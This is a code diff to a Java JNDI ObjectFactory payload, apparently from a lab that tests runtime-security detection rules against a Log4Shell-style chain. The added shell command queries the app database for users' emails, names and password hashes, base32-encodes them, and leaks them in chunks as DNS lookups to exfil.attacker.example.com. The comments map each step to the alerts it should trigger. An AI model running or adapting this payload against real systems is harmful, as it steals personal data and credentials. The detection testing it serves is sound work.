@@ -7,12 +7,17 @@
 // Implementing ObjectFactory + putting the work in getObjectInstance is
 // what the original 2021 demonstrators did.
 //
-// Scenario A: Runtime.exec("/bin/sh", ...) succeeds. The shell runs psql,
-//             base32-encodes the row, and calls getent so node-agent observes
-//             a DNS query with the encoded payload in the label.
+// Scenario A: Runtime.exec("/bin/sh", ...) succeeds. The shell really connects
+//             to the postgres DB (appdb), SELECTs the seeded users PII, base32-
+//             encodes it, and exfiltrates it CHUNKED over DNS via getent — each
+//             chunk a label under *.exfil.attacker.example.com. node-agent sees
+//             the unexpected processes (R0001), the egress (R0011) and the DNS
+//             exfil queries (R0005). The encoded labels carry the real stolen
+//             rows, so the DNS-anomaly alerts literally capture the data in
+//             flight (base32-decode an alert label to recover the PII).
 // Scenario B: identical bytecode runs in JVM. Runtime.exec("/bin/sh") throws
-//             IOException — distroless has no /bin/sh. Falco surfaces the
-//             failed execve(ENOENT).
+//             IOException — distroless has no /bin/sh. R1100 (failed execve
+//             ENOENT) fires on the syscall side.
 // Scenario C: never loaded — log4j 2.17.1 does not perform JNDI substitution.
 
 import java.io.IOException;
@@ -25,16 +30,29 @@ public class Payload implements ObjectFactory {
     @Override
     public Object getObjectInstance(Object obj, Name name, Context ctx, Hashtable<?, ?> env) {
         System.err.println("Payload.getObjectInstance ENTERED");
-        // Single-line shell to keep escaping clean. The pipeline:
-        //   1. psql query returns a postgres row
-        //   2. base32 encode + strip padding + flatten
-        //   3. getent emits a DNS query whose label carries the encoded row
-        String cmd = "set +e; "
-            + "ROW=$(psql -h chain-postgres -U postgres -At "
-            + "-c 'SELECT current_database() || chr(58) || current_user' 2>&1); "
-            + "ENC=$(printf '%s' \"$ROW\" | base32 | tr -d '=' | tr -d '\\n' | cut -c1-40); "
-            + "getent hosts \"${ENC}.exfil.attacker.example.com\" >/dev/null 2>&1; "
-            + "echo done";
+        // Single-line shell for clean escaping. The real post-exploitation chain:
+        //   1. psql connects to appdb (the app's own DB) as postgres and reads
+        //      the WHOLE users table — email:full_name:password_hash per row.
+        //   2. base32-encode + strip padding/newlines, then chunk into 50-char
+        //      DNS-label-safe pieces.
+        //   3. one getent (DNS) query per chunk → the data leaves the container
+        //      as DNS labels (the classic JNDI/log4shell DNS-exfil pattern).
+        // POSTGRES_HOST/DB are read from the backend's own env (the app already
+        // talks to this DB), so the attacker rides existing config.
+        String cmd =
+              "set +e; "
+            + "DB=${POSTGRES_DB:-appdb}; PGHOST=${POSTGRES_HOST:-chain-postgres}; "
+            + "DATA=$(psql -h \"$PGHOST\" -U postgres -d \"$DB\" -At "
+            + "-c \"SELECT string_agg(email || ':' || full_name || ':' || "
+            + "coalesce(password_hash,''), ',') FROM users\" 2>/dev/null); "
+            + "[ -z \"$DATA\" ] && DATA=NODATA; "
+            + "ENC=$(printf '%s' \"$DATA\" | base32 | tr -d '=' | tr -d '\\n'); "
+            + "i=0; "
+            + "printf '%s' \"$ENC\" | fold -w 50 | while IFS= read -r CH; do "
+            + "getent hosts \"${CH}.c${i}.exfil.attacker.example.com\" >/dev/null 2>&1; "
+            + "i=$((i+1)); done; "
+            + "getent hosts \"end.exfil.attacker.example.com\" >/dev/null 2>&1; "
+            + "echo exfil_done";
 
         try {
             Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", cmd});
